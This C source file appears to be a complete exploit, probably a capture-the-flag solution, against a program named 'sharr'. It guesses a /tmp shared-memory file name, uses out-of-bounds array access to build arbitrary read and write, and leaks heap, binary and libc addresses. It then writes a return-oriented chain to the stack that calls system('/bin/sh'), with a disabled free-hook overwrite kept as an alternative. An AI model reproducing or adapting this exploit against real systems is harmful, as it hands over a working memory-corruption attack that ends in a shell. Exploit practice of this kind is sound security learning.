#include <stdio.h>
#include <stdlib.h>
#include <sys/file.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <time.h>
#include <unistd.h>
#include <assert.h>

#define ll long long

#pragma region IO
#define CMD_WAIT 0
#define CMD_EDIT 1
#define CMD_SHOW 2
#define CMD_EXIT 3

typedef struct {
  int command;
  ssize_t index;
  size_t value;
} ArrayIO;

int mapfd;
void send(int command, size_t index, size_t value) {
  ArrayIO io = { .command = command, .index = index, .value = value };
  lseek(mapfd, 0, SEEK_SET);
  write(mapfd, &io, sizeof(ArrayIO));
}

ArrayIO get() {
  ArrayIO io;
  lseek(mapfd, 0, SEEK_SET);
  read(mapfd, &io, sizeof(ArrayIO));
  return io;
}

ArrayIO send_then_get(int command, size_t index, size_t value) {
  ArrayIO io;
  send(command, index, value);
  io = get();
  while ((io = get()).command != CMD_WAIT) usleep(1000);
  return io;
}

void cmd_edit(size_t index, size_t value) {
  send_then_get(CMD_EDIT, index, value);
}
size_t cmd_show(size_t index) {
  return send_then_get(CMD_SHOW, index, -1).value;
}
void cmd_exit() { send_then_get(CMD_EXIT, 0, 0); }

#pragma endregion

const ll ARR_HEAP_OFFSET  = 0x2a0;
const ll WRITE_GOT_OFFSET = 0x3ef8;
const ll ELF_ADDR_OFFSET  = 0x4008;

const ll LIBC_WRITE_OFFSET   = 0x10e060;
const ll LIBC_ENVIRON_OFFSET = 0x1ef600;

const ll LIBC_RET_OFFSET     = 0x000469aa;
const ll LIBC_POP_RDI_OFFSET = 0x0019764d;
const ll LIBC_POP_RSI_OFFSET = 0x00196eb0;
const ll LIBC_POP_RDX_OFFSET = 0x00142c92;

const ll LIBC_FREEHOOK_OFFSET = 0x1eee48;
const ll LIBC_SYSTEM_OFFSET   = 0x052290;
const ll LIBC_BINSH_OFFSET    = 0x1b45bd;

ll heap_offset;
size_t read_offset(ll offset) {
  return cmd_show((-heap_offset - ARR_HEAP_OFFSET + offset) / 8);
}
ll elf_base;
size_t aar(ll addr) {
  return read_offset(addr - elf_base);
}
void aaw(ll addr, ll val) {
  cmd_edit((-heap_offset - ARR_HEAP_OFFSET + addr - elf_base) / 8, val);
}
ll libc_base;

char progname[] = "./sharr";
char* args[] = { progname, "-v", "3585", NULL };

int main() {
  char mapname[20];
  pid_t pid;

  umask(0);
  pid = fork();
  if (pid == 0) {
    execve(progname, args, NULL);
    _exit(1);
  }
  else {
    srand(time(NULL));
    snprintf(mapname, sizeof(mapname), "/tmp/.shm-%08x", rand());
    printf("[+] predicted file name: %s. try to open...\n", mapname);
    while ((mapfd = open(mapname, O_RDWR)) == -1);
    printf("[+] opened at: %d\n", mapfd);

    usleep(100000);
    cmd_edit(0, 0xdeadbeef);
    if (cmd_show(0) == 0xdeadbeef) {
      puts("[+] sanity check: OK");
    } else {
      puts("[-] sanity check: fail");
      exit(1);
    }

    printf("[+] leaking heap offset...\n");

    int step = 5;
    heap_offset = -1;
    for (int i = 5; i < 0x2000; i += step) {
      if (i % 100 == 0) printf("[*] %d / %d\n", i, 0x2000);
      heap_offset = i << 12;
      size_t res = cmd_show((-heap_offset - ARR_HEAP_OFFSET) / 8);
      if ((res & 0xffffffff) == 0x464c457f) {
        printf("[+] found. heap_offset: %p\n", (void*)heap_offset);
        break;
      }
      if (res != -1 && step != 1) {
        printf("[+] found mapped memory (0x%lx)\n", res);
        step = 1;
      }
    }

    elf_base = read_offset(ELF_ADDR_OFFSET) - ELF_ADDR_OFFSET;
    printf("[+] elf_base: %p\n", (void*)elf_base);

    ll write_addr = read_offset(WRITE_GOT_OFFSET);
    libc_base = write_addr - LIBC_WRITE_OFFSET;
    printf("[+] libc_base: %p\n", (void*)libc_base);

#if 0
    // free_hook
    cmd_edit(0, 0x68732f6e69622f); // /bin/sh
    aaw(libc_base + LIBC_FREEHOOK_OFFSET, libc_base + LIBC_SYSTEM_OFFSET);
    cmd_exit();
#else
    // rop
    ll environ_addr = aar(libc_base + LIBC_ENVIRON_OFFSET);
    printf("[+] environ_addr: %p\n", (void*)environ_addr);

    ll ret_addr = environ_addr - 0x150;

    aaw(ret_addr, libc_base + LIBC_POP_RDI_OFFSET); ret_addr += 8;
    aaw(ret_addr, libc_base + LIBC_BINSH_OFFSET); ret_addr += 8;
    aaw(ret_addr, libc_base + LIBC_POP_RSI_OFFSET); ret_addr += 8;
    aaw(ret_addr, 0); ret_addr += 8;
    aaw(ret_addr, libc_base + LIBC_POP_RDX_OFFSET); ret_addr += 8;
    aaw(ret_addr, 0); ret_addr += 8;
    aaw(ret_addr, libc_base + LIBC_RET_OFFSET); ret_addr += 8;
    aaw(ret_addr, libc_base + LIBC_SYSTEM_OFFSET); ret_addr += 8;

    cmd_exit();
#endif
  }
}
